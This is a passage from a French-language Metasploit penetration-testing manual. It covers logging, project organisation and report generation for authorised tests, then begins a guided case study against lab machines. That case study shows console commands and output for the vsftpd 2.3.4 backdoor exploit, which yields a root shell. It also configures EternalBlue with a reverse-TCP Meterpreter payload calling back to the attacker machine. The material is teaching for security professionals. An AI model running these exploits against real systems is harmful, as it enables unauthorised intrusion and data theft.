meterpreter > record -o /home/kali/pentest/logs/meterpreter_session1.rec

# Lecture d'un enregistrement
msf6 > makerc /home/kali/pentest/logs/session_replay.rc /home/kali/pentest/logs/meterpreter_session1.rec
msf6 > resource /home/kali/pentest/logs/session_replay.rc
```

### Journalisation des commandes système

```
# Utilisation de script pour enregistrer les commandes shell
script -a /home/kali/pentest/logs/commands_$(date +%Y%m%d_%H%M%S).log

# Utilisation de tee pour capturer les sorties
nmap -sV 192.168.1.0/24 | tee /home/kali/pentest/logs/nmap_scan.log
```

## Organisation des données collectées

### Structure de répertoires recommandée

```bash
# Création d'une structure de répertoires pour un projet
mkdir -p ~/pentest/client_xyz_mai2025/{scans,exploits,loot,screenshots,logs,reports}
```

Structure recommandée :

```
client_xyz_mai2025/
├── scans/              # Résultats de reconnaissance
│   ├── nmap/           # Scans Nmap
│   ├── web/            # Scans d'applications web
│   └── vulnscan/       # Scans de vulnérabilités
├── exploits/           # Exploits utilisés ou personnalisés
├── loot/               # Données extraites des systèmes
│   ├── hashes/         # Hachages de mots de passe
│   ├── credentials/    # Identifiants en clair
│   └── files/          # Fichiers sensibles
├── screenshots/        # Captures d'écran
├── logs/               # Journaux d'activité
│   ├── metasploit/     # Logs Metasploit
│   ├── meterpreter/    # Sessions Meterpreter
│   └── commands/       # Commandes système
└── reports/            # Rapports finaux et intermédiaires
```

> **COMMENT ?**  
> Cette structure standardisée facilite la navigation et la recherche d'informations, même plusieurs mois après la fin d'un projet. Elle permet également de rapidement identifier les données manquantes et d'assurer la cohérence entre différents projets.

### Gestion des données sensibles

```bash
# Chiffrement des données sensibles
tar -czf client_xyz_loot.tar.gz ~/pentest/client_xyz_mai2025/loot/
gpg -e -r votre@email.com client_xyz_loot.tar.gz

# Suppression sécurisée des données après le projet
find ~/pentest/client_xyz_mai2025/loot/ -type f -exec shred -u {} \;
```

## Automatisation de la documentation

### Scripts resource pour la documentation

Créez un fichier `document.rc` dans votre répertoire de travail :

```
# Contenu du fichier document.rc
<ruby>
def document_workspace(workspace_name, output_dir)
  run_single("workspace #{workspace_name}")
  
  # Documentation des hôtes
  run_single("hosts -c address,os_name,purpose -o #{output_dir}/hosts.csv")
  
  # Documentation des services
  run_single("services -c port,proto,name,info -o #{output_dir}/services.csv")
  
  # Documentation des vulnérabilités
  run_single("vulns -o #{output_dir}/vulnerabilities.csv")
  
  # Documentation du butin
  run_single("loot -o #{output_dir}/loot.csv")
  
  # Exportation complète de la base de données
  run_single("db_export -f xml #{output_dir}/full_database.xml")
  
  print_status("Documentation completed for workspace #{workspace_name}")
end

workspace_name = framework.datastore['WORKSPACE'] || framework.db.workspace.name
output_dir = framework.datastore['OUTPUT_DIR'] || "/home/kali/pentest/documentation"

document_workspace(workspace_name, output_dir)
</ruby>
```

Utilisation du script :

```
msf6 > setg OUTPUT_DIR /home/kali/pentest/client_xyz_mai2025/reports
msf6 > resource document.rc
```

### Automatisation avec Python

Créez un script Python pour générer automatiquement de la documentation :

```python
#!/usr/bin/env python3
# Fichier: msf_report_generator.py

import os
import sys
import subprocess
import datetime
import pandas as pd
import matplotlib.pyplot as plt
from pymetasploit3.msfrpc import MsfRpcClient

# Configuration
MSF_PASSWORD = "password"
OUTPUT_DIR = "/home/kali/pentest/client_xyz_mai2025/reports"
WORKSPACE = "client_xyz_mai2025"

# Connexion à Metasploit
client = MsfRpcClient(MSF_PASSWORD)

# Création du répertoire de sortie
os.makedirs(OUTPUT_DIR, exist_ok=True)

# Exécution de commandes Metasploit via l'API RPC
def run_console_command(command):
    console_id = client.consoles.console().cid
    client.consoles.console(console_id).write(f"workspace {WORKSPACE}\n{command}")
    time.sleep(1)  # Attente pour l'exécution
    result = client.consoles.console(console_id).read()
    return result['data']

# Génération de statistiques
hosts_data = run_console_command("hosts -c address,os_name")
services_data = run_console_command("services -c port,proto,name")
vulns_data = run_console_command("vulns")

# Création de graphiques
# [Code pour générer des graphiques avec matplotlib]

# Génération du rapport HTML
html_report = f"""
<html>
<head><title>Rapport Metasploit - {WORKSPACE}</title></head>
<body>
<h1>Rapport Metasploit - {WORKSPACE}</h1>
<p>Date: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>

<h2>Résumé</h2>
<p>Nombre d'hôtes: {len(hosts_data.splitlines()) - 2}</p>
<p>Nombre de services: {len(services_data.splitlines()) - 2}</p>
<p>Nombre de vulnérabilités: {len(vulns_data.splitlines()) - 2}</p>

<h2>Détails</h2>
<!-- Contenu détaillé du rapport -->
</body>
</html>
"""

with open(f"{OUTPUT_DIR}/report.html", "w") as f:
    f.write(html_report)

print(f"Rapport généré dans {OUTPUT_DIR}/report.html")
```

Exécution du script :

```bash
python3 msf_report_generator.py
```

> **POURQUOI ?**  
> L'automatisation de la documentation permet de gagner un temps considérable et d'assurer la cohérence des rapports. Elle permet également de générer des rapports intermédiaires réguliers pour suivre l'avancement du projet et communiquer avec le client.

## Génération de rapports professionnels

### Types de rapports

| Type | Public cible | Contenu | Format |
|------|--------------|---------|--------|
| Rapport exécutif | Direction | Résumé, impact business, recommandations | PDF, 5-10 pages |
| Rapport technique | Équipe technique | Détails techniques, preuves, méthodologie | PDF, 20-50 pages |
| Rapport de vulnérabilités | Équipe de correction | Liste détaillée des vulnérabilités, étapes de reproduction | CSV, XLSX |
| Rapport de suivi | Gestion de projet | Progrès, obstacles, prochaines étapes | Email, 1-2 pages |

### Utilisation de l'extension MSF-Report

```
# Installation de l'extension
mkdir -p ~/.msf4/plugins
wget https://raw.githubusercontent.com/darkoperator/Metasploit-Plugins/master/report.rb -O ~/.msf4/plugins/report.rb

# Chargement de l'extension
msf6 > load report

# Génération d'un rapport
msf6 > report generate -t pentest -f pdf -o /home/kali/pentest/client_xyz_mai2025/reports/rapport_metasploit.pdf
```

Options importantes pour le module `report` :

| Option | Description | Exemple |
|--------|-------------|---------|
| `-t` | Type de rapport | `-t pentest` |
| `-f` | Format de sortie | `-f pdf` |
| `-o` | Fichier de sortie | `-o /path/to/report.pdf` |
| `-s` | Inclure les captures d'écran | `-s` |
| `-c` | Inclure les informations client | `-c "Client XYZ"` |

### Conversion des données Metasploit en rapport avec MSF-PDF

```
# Installation de MSF-PDF
git clone https://github.com/singlethink/msf-pdf.git
cd msf-pdf
sudo gem install prawn

# Exportation des données Metasploit
msf6 > db_export -f xml /home/kali/pentest/client_xyz_mai2025/reports/msf_data.xml

# Génération du rapport PDF
ruby msf-pdf.rb -i /home/kali/pentest/client_xyz_mai2025/reports/msf_data.xml -o /home/kali/pentest/client_xyz_mai2025/reports/msf_report.pdf -t "Rapport de test d'intrusion - Client XYZ" -a "Votre Nom" -c "Confidentiel"
```

### Intégration avec des outils de reporting externes

#### Dradis Framework

Dradis est une plateforme collaborative de reporting pour les tests de sécurité.

```bash
# Installation de Dradis CE
git clone https://github.com/dradis/dradis-ce.git
cd dradis-ce
./bin/setup
./bin/rails server

# Exportation des données Metasploit pour Dradis
msf6 > db_export -f xml /home/kali/pentest/client_xyz_mai2025/reports/msf_data.xml
```

Importez ensuite le fichier XML dans l'interface web de Dradis (http://localhost:3000).

#### Faraday

Faraday est un IDE collaboratif pour les tests de sécurité.

```bash
# Installation de Faraday
sudo apt install python3-faraday

# Lancement de Faraday
systemctl start faraday-server
firefox http://localhost:5985

# Exportation des données Metasploit pour Faraday
msf6 > db_export -f xml /home/kali/pentest/client_xyz_mai2025/reports/msf_data.xml
```

Importez ensuite le fichier XML dans l'interface web de Faraday.

> **COMMENT ?**  
> Les outils comme Dradis et Faraday facilitent la collaboration en équipe et la génération de rapports professionnels. Ils permettent également de centraliser les données de différents outils de sécurité, pas seulement Metasploit.

## Structure recommandée pour les rapports

### Rapport exécutif

1. **Introduction**
   - Contexte et objectifs du test
   - Périmètre et limitations
   - Méthodologie générale

2. **Résumé des résultats**
   - Niveau de risque global
   - Nombre de vulnérabilités par niveau de gravité
   - Graphique de répartition des vulnérabilités

3. **Impact business**
   - Conséquences potentielles pour l'entreprise
   - Scénarios d'attaque réalistes

4. **Recommandations stratégiques**
   - Actions prioritaires
   - Stratégie de remédiation à moyen terme
   - Améliorations de la posture de sécurité

### Rapport technique

1. **Introduction**
   - Contexte et objectifs
   - Périmètre détaillé
   - Méthodologie détaillée
   - Outils utilisés

2. **Résumé des résultats**
   - Statistiques détaillées
   - Cartographie des systèmes testés
   - Tableau récapitulatif des vulnérabilités

3. **Détail des vulnérabilités**
   - Description technique
   - Preuves de concept
   - Étapes de reproduction
   - Impact technique
   - Recommandations de correction

4. **Scénarios d'attaque**
   - Chaînes d'exploitation
   - Démonstration de l'impact

5. **Annexes**
   - Logs et captures d'écran
   - Détails des scans
   - Références techniques

## Bonnes pratiques pour le reporting

### Standardisation des rapports

Créez des modèles de rapport standardisés pour assurer la cohérence entre les différents projets :

```bash
# Création d'un répertoire de modèles
mkdir -p ~/pentest/templates/{executive,technical,vulnerability}

# Création d'un modèle de rapport exécutif
cat > ~/pentest/templates/executive/template.md << EOF
# Rapport exécutif - Test d'intrusion

## Client : [NOM_CLIENT]
## Date : [DATE]
## Référence : [REFERENCE]

## 1. Introduction

### 1.1 Contexte et objectifs
[CONTEXTE]

### 1.2 Périmètre
[PERIMETRE]

### 1.3 Méthodologie
[METHODOLOGIE]

## 2. Résumé des résultats

### 2.1 Niveau de risque global
[NIVEAU_RISQUE]

### 2.2 Répartition des vulnérabilités
[GRAPHIQUE_VULNERABILITES]

## 3. Impact business

[IMPACT_BUSINESS]

## 4. Recommandations stratégiques

[RECOMMANDATIONS]
EOF
```

> **POURQUOI ?**  
> La standardisation des rapports permet de gagner du temps, d'assurer la cohérence de la qualité et de faciliter la comparaison entre différents tests. Elle permet également aux clients réguliers de se familiariser avec votre format de rapport.

### Présentation des vulnérabilités

Pour chaque vulnérabilité, incluez systématiquement :

1. **Titre clair et descriptif**
2. **Identifiant unique** (CVE si applicable)
3. **Niveau de gravité** (Critique, Élevé, Moyen, Faible, Informatif)
4. **Systèmes affectés**
5. **Description technique**
6. **Preuves de concept** (captures d'écran, extraits de code)
7. **Étapes de reproduction**
8. **Impact potentiel**
9. **Recommandations de correction**
10. **Références** (documentation, articles, etc.)

Exemple de format standardisé :

```markdown
## Vulnérabilité : Exécution de code à distance via MS17-010 (EternalBlue)

**Identifiant** : CVE-2017-0144
**Gravité** : Critique
**Systèmes affectés** : 192.168.1.100, 192.168.1.101

### Description
La vulnérabilité MS17-010 permet à un attaquant d'exécuter du code arbitraire sur le système cible en envoyant des paquets spécialement conçus au service SMB.

### Preuve de concept
![Capture d'écran de l'exploitation](/home/kali/pentest/client_xyz_mai2025/screenshots/eternalblue_exploit.png)

### Étapes de reproduction
1. Utilisation du module `exploit/windows/smb/ms17_010_eternalblue`
2. Configuration de RHOSTS à 192.168.1.100
3. Exécution de l'exploit
4. Obtention d'un shell système

### Impact
Cette vulnérabilité permet à un attaquant d'obtenir un contrôle total du système sans authentification préalable, donnant accès à toutes les données et fonctionnalités.

### Recommandations
1. Appliquer immédiatement le correctif de sécurité MS17-010 de Microsoft
2. Désactiver SMBv1 sur tous les systèmes
3. Segmenter le réseau pour limiter la propagation latérale

### Références
- https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010
- https://blog.rapid7.com/2017/05/12/wanna-decryptor-wncry-ransomware-explained/
```

### Automatisation de la génération de rapports avec Python

Créez un script Python pour générer automatiquement des rapports à partir des données Metasploit :

```python
#!/usr/bin/env python3
# Fichier: generate_report.py

import os
import sys
import xml.etree.ElementTree as ET
import pandas as pd
import matplotlib.pyplot as plt
from fpdf import FPDF

# Configuration
XML_FILE = "/home/kali/pentest/client_xyz_mai2025/reports/msf_data.xml"
OUTPUT_PDF = "/home/kali/pentest/client_xyz_mai2025/reports/rapport_technique.pdf"
CLIENT_NAME = "Client XYZ"
TEST_DATE = "Mai 2025"

# Parsing du fichier XML
tree = ET.parse(XML_FILE)
root = tree.getroot()

# Extraction des données
hosts = []
for host in root.findall(".//host"):
    host_data = {
        "address": host.find("address").text,
        "os": host.find("os_name").text if host.find("os_name") is not None else "Unknown"
    }
    hosts.append(host_data)

vulns = []
for vuln in root.findall(".//vuln"):
    vuln_data = {
        "host": vuln.find("host").text,
        "name": vuln.find("name").text,
        "info": vuln.find("info").text if vuln.find("info") is not None else "",
        "refs": [ref.text for ref in vuln.findall("refs/ref")]
    }
    vulns.append(vuln_data)

# Création de graphiques
# [Code pour générer des graphiques avec matplotlib]

# Génération du rapport PDF
pdf = FPDF()
pdf.add_page()
pdf.set_font("Arial", "B", 16)
pdf.cell(0, 10, f"Rapport technique - Test d'intrusion", 0, 1, "C")
pdf.cell(0, 10, f"Client: {CLIENT_NAME}", 0, 1, "C")
pdf.cell(0, 10, f"Date: {TEST_DATE}", 0, 1, "C")

# Ajout du contenu
pdf.add_page()
pdf.set_font("Arial", "B", 14)
pdf.cell(0, 10, "1. Introduction", 0, 1)
pdf.set_font("Arial", "", 12)
pdf.multi_cell(0, 10, "Ce rapport présente les résultats du test d'intrusion réalisé pour le Client XYZ en Mai 2025.")

# [Suite du code pour générer le rapport complet]

pdf.output(OUTPUT_PDF)
print(f"Rapport généré : {OUTPUT_PDF}")
```

Exécution du script :

```bash
python3 generate_report.py
```

## Gestion des données à long terme

### Archivage des projets

```bash
# Archivage d'un projet complet
cd ~/pentest
tar -czf client_xyz_mai2025.tar.gz client_xyz_mai2025/
gpg -e -r votre@email.com client_xyz_mai2025.tar.gz

# Stockage sécurisé
mv client_xyz_mai2025.tar.gz.gpg /media/backup/archives/
```

### Politique de conservation des données

Établissez une politique claire de conservation des données :

1. **Données sensibles** (identifiants, hachages) : 30 jours après la fin du projet
2. **Logs et captures d'écran** : 6 mois
3. **Rapports finaux** : 5 ans
4. **Contrats et autorisations** : 10 ans

Documentez cette politique et assurez-vous qu'elle est conforme aux réglementations applicables (RGPD, etc.).

> **POURQUOI ?**  
> Une politique de conservation des données claire permet de respecter les obligations légales tout en minimisant les risques liés à la conservation de données sensibles. Elle permet également de gérer efficacement l'espace de stockage et de retrouver facilement les informations importantes.

### Base de connaissances interne

Créez une base de connaissances pour capitaliser sur les expériences passées :

```bash
# Structure de la base de connaissances
mkdir -p ~/pentest/knowledge_base/{vulnerabilities,techniques,tools,templates}

# Exemple d'entrée pour une vulnérabilité
cat > ~/pentest/knowledge_base/vulnerabilities/ms17_010.md << EOF
# MS17-010 (EternalBlue)

## Description
Vulnérabilité d'exécution de code à distance dans le service SMB de Windows.

## Détection
- Nmap: \`nmap --script smb-vuln-ms17-010 -p 445 <target>\`
- Metasploit: \`use auxiliary/scanner/smb/smb_ms17_010\`

## Exploitation
- Metasploit: \`use exploit/windows/smb/ms17_010_eternalblue\`
- Options importantes:
  - RHOSTS: Adresse IP cible
  - LHOST: Adresse IP de l'attaquant
  - LPORT: Port d'écoute (défaut: 4444)

## Correction
- Appliquer le correctif MS17-010
- Désactiver SMBv1
- Segmenter le réseau

## Projets concernés
- client_abc_avril2025: 3 systèmes vulnérables
- client_xyz_mai2025: 2 systèmes vulnérables

## Références
- https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010
- https://blog.rapid7.com/2017/05/12/wanna-decryptor-wncry-ransomware-explained/
EOF
```

## En résumé

La gestion efficace des workspaces, des logs et du reporting est essentielle pour transformer un simple test technique en une prestation professionnelle complète. Elle permet de maintenir l'organisation entre différents projets, d'assurer la traçabilité des actions et de produire des rapports exploitables par les clients.

Points clés à retenir :
- Utilisez systématiquement les workspaces pour séparer les données de différents projets
- Activez la journalisation complète de toutes vos actions pour assurer la traçabilité
- Organisez vos données selon une structure standardisée pour faciliter la navigation
- Automatisez la documentation et la génération de rapports pour gagner du temps
- Adaptez vos rapports aux différents publics cibles (direction, équipe technique)
- Établissez une politique claire de conservation des données
- Capitalisez sur vos expériences en maintenant une base de connaissances interne

Dans la section suivante, nous verrons comment mettre en pratique toutes ces connaissances à travers une étude de cas guidée, illustrant un test d'intrusion complet avec Metasploit.
# Étude de cas guidée : Pentest d'un réseau interne

## Introduction

Cette étude de cas a pour objectif d'illustrer concrètement l'application de la méthodologie et des outils présentés dans ce manuel. Nous allons simuler un test d'intrusion interne sur un réseau fictif, en suivant les étapes clés de la reconnaissance à la post-exploitation, en utilisant Metasploit Framework et les outils associés.

### Scénario

Vous êtes mandaté pour réaliser un test d'intrusion interne sur le réseau de l'entreprise "ACME Corp". L'objectif est d'évaluer la sécurité du réseau interne depuis le point de vue d'un attaquant ayant déjà un accès initial (par exemple, via un poste de travail compromis ou un accès physique).

**Périmètre :** Le réseau 192.168.10.0/24
**Objectifs :**
1. Identifier les systèmes vulnérables.
2. Obtenir un accès administrateur sur au moins un serveur critique.
3. Récupérer des informations sensibles (fichiers, identifiants).
4. Évaluer les possibilités de mouvement latéral.

**Environnement de test :**
- Machine attaquante : Kali Linux (192.168.10.50)
- Cibles : Machines virtuelles vulnérables (Metasploitable 2, Windows Server vulnérable, etc.) sur le réseau 192.168.10.0/24.

> **POURQUOI ?**  
> Une étude de cas permet de contextualiser les commandes et les techniques apprises. En suivant un scénario réaliste, vous pouvez mieux comprendre comment les différentes étapes s'articulent et comment adapter votre approche en fonction des découvertes.

## Étape 1 : Préparation et mise en place

### Création du workspace et configuration initiale

```
# Lancement de Metasploit
msfconsole

# Création d'un workspace dédié
msf6 > workspace -a acme_corp_pentest_interne_mai2025
[*] Added workspace: acme_corp_pentest_interne_mai2025
[*] Workspace: acme_corp_pentest_interne_mai2025

# Activation de la journalisation
msf6 > spool /home/kali/pentest/acme_corp/logs/msf_session_$(date +%Y%m%d_%H%M%S).log
[*] Spooling to file /home/kali/pentest/acme_corp/logs/msf_session_20250527_160000.log...

# Vérification de la connexion à la base de données
msf6 > db_status
[*] Connected to msf. Connection type: postgresql.

# Configuration de l'adresse IP locale
msf6 > setg LHOST 192.168.10.50
LHOST => 192.168.10.50
```

> **COMMENT ?**  
> Commencez toujours par créer un workspace dédié et activer la journalisation. Cela garantit que toutes vos actions et découvertes sont correctement isolées et enregistrées pour le rapport final.

## Étape 2 : Reconnaissance réseau

### Découverte des hôtes actifs

```
msf6 > db_nmap -sn 192.168.10.0/24
[*] Nmap: Starting Nmap 7.93 ( https://nmap.org ) at 2025-05-27 16:02 CEST
[*] Nmap: Nmap scan report for 192.168.10.1
[*] Nmap: Host is up (0.0010s latency).
[*] Nmap: Nmap scan report for 192.168.10.101 (metasploitable.localdomain)
[*] Nmap: Host is up (0.00050s latency).
[*] Nmap: Nmap scan report for 192.168.10.102
[*] Nmap: Host is up (0.00045s latency).
[*] Nmap: Nmap scan report for 192.168.10.105
[*] Nmap: Host is up (0.00060s latency).
[*] Nmap: Nmap done: 256 IP addresses (4 hosts up) scanned in 2.15 seconds
```

### Scan de ports et détection de services/versions

```
msf6 > hosts

Hosts
=====

address        mac                name                          os_name  os_flavor  os_sp  purpose  info  comments
-------        ---                ----                          -------  ---------  -----  -------  ----
192.168.10.1   00:50:56:C0:00:08                                                              device
192.168.10.101 08:00:27:A5:A6:76  metasploitable.localdomain                                 server
192.168.10.102 08:00:27:B1:C3:D5                                                              server
192.168.10.105 08:00:27:E4:F5:A1                                                              server

msf6 > db_nmap -sS -sV -O --script default,vuln -p- 192.168.10.101,192.168.10.102,192.168.10.105
[*] Nmap: Starting Nmap 7.93 ( https://nmap.org ) at 2025-05-27 16:05 CEST
... (long output omitted for brevity) ...
[*] Nmap: Nmap scan report for 192.168.10.101 (metasploitable.localdomain)
[*] Nmap: Host is up (0.00050s latency).
[*] Nmap: Not shown: 65500 closed tcp ports (reset)
[*] Nmap: PORT      STATE SERVICE      VERSION
[*] Nmap: 21/tcp    open  ftp          vsftpd 2.3.4
[*] Nmap: |_ftp-anon: Anonymous FTP login allowed (FTP code 230)
[*] Nmap: |_ftp-vsftpd-backdoor: VULNERABLE:
[*] Nmap: |   vsFTPd version 2.3.4 backdoor, command execution
[*] Nmap: |     State: VULNERABLE (Exploitable)
[*] Nmap: 22/tcp    open  ssh          OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
[*] Nmap: 23/tcp    open  telnet       Linux telnetd
[*] Nmap: 25/tcp    open  smtp         Postfix smtpd
[*] Nmap: 53/tcp    open  domain       ISC BIND 9.4.2
[*] Nmap: 80/tcp    open  http         Apache httpd 2.2.8 ((Ubuntu) DAV/2)
[*] Nmap: 111/tcp   open  rpcbind      2 (RPC #100000)
[*] Nmap: 139/tcp   open  netbios-ssn  Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
[*] Nmap: 445/tcp   open  netbios-ssn  Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
[*] Nmap: 512/tcp   open  exec         netkit-rsh rexecd
[*] Nmap: 513/tcp   open  login        OpenBSD or Solaris rlogind
[*] Nmap: 514/tcp   open  shell        netkit-rsh rshd
[*] Nmap: 1099/tcp  open  java-rmi     GNU Classpath grmiregistry
[*] Nmap: 1524/tcp  open  bindshell    Metasploitable root shell
[*] Nmap: 2049/tcp  open  nfs          2-4 (RPC #100003)
[*] Nmap: 2121/tcp  open  ftp          ProFTPD 1.3.1
[*] Nmap: 3306/tcp  open  mysql        MySQL 5.0.51a-3ubuntu5
[*] Nmap: 5432/tcp  open  postgresql   PostgreSQL DB 8.3.0 - 8.3.7
[*] Nmap: 5900/tcp  open  vnc          VNC protocol 3.3
[*] Nmap: 6000/tcp  open  X11          (access denied)
[*] Nmap: 6667/tcp  open  irc          UnrealIRCd
[*] Nmap: 8009/tcp  open  ajp13        Apache Jserv (Protocol v1.3)
[*] Nmap: 8180/tcp  open  http         Apache Tomcat/Coyote JSP engine 1.1
[*] Nmap: OS: Linux 2.6.X (Linux 2.6.24)

[*] Nmap: Nmap scan report for 192.168.10.102
[*] Nmap: Host is up (0.00045s latency).
[*] Nmap: Not shown: 65530 closed tcp ports (reset)
[*] Nmap: PORT     STATE SERVICE       VERSION
[*] Nmap: 135/tcp  open  msrpc         Microsoft Windows RPC
[*] Nmap: 139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
[*] Nmap: 445/tcp  open  microsoft-ds  Windows Server 2008 R2 Standard 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
[*] Nmap: |_smb-vuln-ms17-010: VULNERABLE:
[*] Nmap: |   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
[*] Nmap: |     State: VULNERABLE
[*] Nmap: 3389/tcp open  ms-wbt-server Microsoft Terminal Services
[*] Nmap: OS: Windows Server 2008 R2 SP1 (Windows Server 2008 R2 Standard 7601 Service Pack 1)

[*] Nmap: Nmap scan report for 192.168.10.105
[*] Nmap: Host is up (0.00060s latency).
[*] Nmap: Not shown: 65533 closed tcp ports (reset)
[*] Nmap: PORT   STATE SERVICE VERSION
[*] Nmap: 80/tcp open  http    Microsoft IIS httpd 7.5
[*] Nmap: OS: Windows 7 or 8 (Windows 7 Professional 7601 Service Pack 1)

[*] Nmap: Nmap done: 3 IP addresses (3 hosts up) scanned in 185.32 seconds
```

## Étape 3 : Analyse des résultats

### Consultation des données dans Metasploit

```
msf6 > hosts

Hosts
=====

address        mac                name                          os_name              os_flavor  os_sp  purpose  info        comments
-------        ---                ----                          -------              ---------  -----  -------  ----        --------
192.168.10.1   00:50:56:C0:00:08                                                               device
192.168.10.101 08:00:27:A5:A6:76  metasploitable.localdomain  Linux                2.6.X             server   Linux 2.6.24
192.168.10.102 08:00:27:B1:C3:D5                                Windows Server 2008  R2         SP1    server
192.168.10.105 08:00:27:E4:F5:A1                                Windows 7            Professional SP1    client

msf6 > services

Services
========

host            port  proto  name           state  info
----            ----  -----  ----           -----  ----
192.168.10.101  21    tcp    ftp            open   vsftpd 2.3.4
192.168.10.101  22    tcp    ssh            open   OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
192.168.10.101  23    tcp    telnet         open   Linux telnetd
192.168.10.101  80    tcp    http           open   Apache httpd 2.2.8 ((Ubuntu) DAV/2)
192.168.10.101  139   tcp    netbios-ssn    open   Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
192.168.10.101  445   tcp    netbios-ssn    open   Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
192.168.10.101  1524  tcp    bindshell      open   Metasploitable root shell
192.168.10.101  3306  tcp    mysql          open   MySQL 5.0.51a-3ubuntu5
192.168.10.101  5432  tcp    postgresql     open   PostgreSQL DB 8.3.0 - 8.3.7
192.168.10.101  5900  tcp    vnc            open   VNC protocol 3.3
192.168.10.101  6667  tcp    irc            open   UnrealIRCd
192.168.10.101  8180  tcp    http           open   Apache Tomcat/Coyote JSP engine 1.1
192.168.10.102  135   tcp    msrpc          open   Microsoft Windows RPC
192.168.10.102  139   tcp    netbios-ssn    open   Microsoft Windows netbios-ssn
192.168.10.102  445   tcp    microsoft-ds   open   Windows Server 2008 R2 Standard 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
192.168.10.102  3389  tcp    ms-wbt-server  open   Microsoft Terminal Services
192.168.10.105  80    tcp    http           open   Microsoft IIS httpd 7.5

msf6 > vulns

Vulnerabilities
===============

Timestamp                Host            Name                                References
---------                ----            ----                                ----------
2025-05-27 16:06:15 UTC  192.168.10.101  vsFTPd 2.3.4 Backdoor Command Execution
2025-05-27 16:07:30 UTC  192.168.10.102  MS17-010 SMB RCE Detection            CVE-2017-0143,CVE-2017-0144,CVE-2017-0145,CVE-2017-0146,CVE-2017-0147,CVE-2017-0148
```

### Identification des cibles prioritaires

L'analyse révèle plusieurs cibles intéressantes :
- **192.168.10.101 (Metasploitable)** : Nombreux services vulnérables (vsFTPd backdoor, Telnet, etc.). Cible facile pour un accès initial.
- **192.168.10.102 (Windows Server 2008 R2)** : Vulnérable à MS17-010 (EternalBlue). Cible critique pour l'objectif d'accès administrateur.
- **192.168.10.105 (Windows 7)** : Moins de services exposés, mais pourrait être une cible pour le mouvement latéral.

> **POURQUOI ?**  
> L'analyse des résultats permet de prioriser les efforts. Ici, le serveur Windows 2008 R2 (192.168.10.102) est la cible la plus prometteuse pour atteindre l'objectif principal (accès administrateur) grâce à la vulnérabilité MS17-010.

## Étape 4 : Recherche d'exploits

### Recherche pour vsFTPd 2.3.4

```
msf6 > search vsftpd 2.3.4

Matching Modules
================

   #  Name                                   Disclosure Date  Rank       Check  Description
   -  ----                                   ---------------  ----       -----  -----------
   0  exploit/unix/ftp/vsftpd_234_backdoor   2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution
```

### Recherche pour MS17-010

```
msf6 > search ms17-010

Matching Modules
================

   #   Name                                                     Disclosure Date  Rank       Check  Description
   -   ----                                                     ---------------  ----       -----  -----------
   0   auxiliary/admin/smb/ms17_010_command                     2017-03-14       normal     Yes    MS17-010 SMB RCE Detection
   1   auxiliary/scanner/smb/smb_ms17_010                                        normal     No     MS17-010 SMB RCE Detection
   2   exploit/windows/smb/ms17_010_eternalblue                 2017-03-14       excellent  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   3   exploit/windows/smb/ms17_010_eternalblue_win8plus        2017-03-14       average    Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
   4   exploit/windows/smb/ms17_010_eternalromance              2017-03-14       excellent  Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Kernel Pool Corruption
   5   exploit/windows/smb/ms17_010_psexec                      2017-03-14       normal     Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   6   exploit/windows/smb/smb_doublepulsar_rce                 2017-04-14       great      Yes    SMB DOUBLEPULSAR Remote Code Execution
```

## Étape 5 : Sélection et exécution d'exploits

### Exploitation de vsFTPd (192.168.10.101)

```
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.10.101
RHOSTS => 192.168.10.101
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit

[*] 192.168.10.101:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.168.10.101:21 - USER anonymous: 331 Please specify the password.
[*] 192.168.10.101:21 - PASS <password>: 230 Login successful.
[+] 192.168.10.101:21 - Backdoor service has been spawned, handling...!
[+] 192.168.10.101:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 1 opened (192.168.10.50:43215 -> 192.168.10.101:6200) at 2025-05-27 16:15:00 +0000

# Vérification de l'accès
sessions -i 1
whoami
root
uname -a
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
exit
```

### Exploitation de MS17-010 (192.168.10.102)

```
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.10.102
RHOSTS => 192.168.10.102
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):
...
Payload options (windows/x64/meterpreter/reverse_tcp):
   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.10.50    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port
...

msf6 exploit(windows/smb/ms17_010_eternalblue) > check
[*] 192.168.10.102:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 192.168.10.102:445 - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 R2 Standard 7601 Service Pack 1
[*] 192.168.10.102:445 - Scanned 1 of 1 hosts (100% complete)
